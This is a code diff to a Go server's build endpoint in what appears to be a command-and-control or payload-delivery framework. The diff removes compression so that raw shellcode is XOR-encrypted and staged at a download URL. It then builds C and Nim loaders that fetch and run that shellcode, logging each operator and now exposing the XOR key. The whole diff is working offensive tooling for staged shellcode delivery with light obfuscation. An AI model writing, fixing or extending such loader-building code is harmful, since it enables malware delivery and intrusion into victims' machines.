@@ -889,13 +889,10 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "read .bin: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		compressed, err := CompressPayload(rawBin)
-		if err != nil {
-			jsonErr(w, "compress: "+err.Error(), http.StatusInternalServerError)
-			return
-		}
+		// No compression — C loader does XOR-only; executing compressed bytes as
+		// shellcode would fault. Encrypt raw shellcode directly.
 		key, _ := xorKey()
-		encBin := xorBytes(compressed, key)
+		encBin := xorBytes(rawBin, key)
 		encBinPath := binPath + ".enc"
 		if err := os.WriteFile(encBinPath, encBin, 0600); err != nil {
 			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
@@ -909,9 +906,8 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		binURL := cfg.StageURL + "/stage/" + binToken
 		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
 		op := operatorFromCert(r)
-		s.printf("[%s] loader-c shellcode: raw=%dKB → compressed=%dKB (%.0f%%)\n",
-			op, len(rawBin)/1024, len(compressed)/1024,
-			float64(len(compressed))*100/float64(len(rawBin)))
+		s.printf("[%s] loader-c shellcode: raw=%dKB (no compression)\n",
+			op, len(rawBin)/1024)
 		loaderPath, err := BuildCLoader(cfg, binURL, keyHex, deliveryDir)
 		if err != nil {
 			jsonErr(w, "build loader-c: "+err.Error(), http.StatusInternalServerError)
@@ -919,9 +915,9 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		result["loader"] = loaderPath
 		result["bin_stage"] = binURL
-		result["compressed_kb"] = fmt.Sprintf("%d", len(compressed)/1024)
 		result["raw_kb"] = fmt.Sprintf("%d", len(rawBin)/1024)
-		s.printf("[%s] build loader-c: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
+		result["key_hex"] = keyHex
+		s.printf("[%s] build loader-c: stage=%s key=%s\n", op, binURL[:min(len(binURL), 60)], keyHex)
 		jsonOK(w, result)
 		return
 
@@ -945,13 +941,10 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "read .bin: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		compressed, err := CompressPayload(rawBin)
-		if err != nil {
-			jsonErr(w, "compress: "+err.Error(), http.StatusInternalServerError)
-			return
-		}
+		// No compression — Nim loader does XOR-only; executing compressed bytes as
+		// shellcode would fault. Encrypt raw shellcode directly.
 		key, _ := xorKey()
-		encBin := xorBytes(compressed, key)
+		encBin := xorBytes(rawBin, key)
 		encBinPath := binPath + ".enc"
 		if err := os.WriteFile(encBinPath, encBin, 0600); err != nil {
 			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
@@ -965,9 +958,8 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		binURL := cfg.StageURL + "/stage/" + binToken
 		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
 		op := operatorFromCert(r)
-		s.printf("[%s] loader-nim shellcode: raw=%dKB → compressed=%dKB (%.0f%%)\n",
-			op, len(rawBin)/1024, len(compressed)/1024,
-			float64(len(compressed))*100/float64(len(rawBin)))
+		s.printf("[%s] loader-nim shellcode: raw=%dKB (no compression)\n",
+			op, len(rawBin)/1024)
 		loaderPath, err := BuildNimLoader(cfg, binURL, keyHex, deliveryDir)
 		if err != nil {
 			jsonErr(w, "build loader-nim: "+err.Error(), http.StatusInternalServerError)
@@ -975,7 +967,6 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		result["loader"] = loaderPath
 		result["bin_stage"] = binURL
-		result["compressed_kb"] = fmt.Sprintf("%d", len(compressed)/1024)
 		result["raw_kb"] = fmt.Sprintf("%d", len(rawBin)/1024)
 		s.printf("[%s] build loader-nim: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
 		jsonOK(w, result)
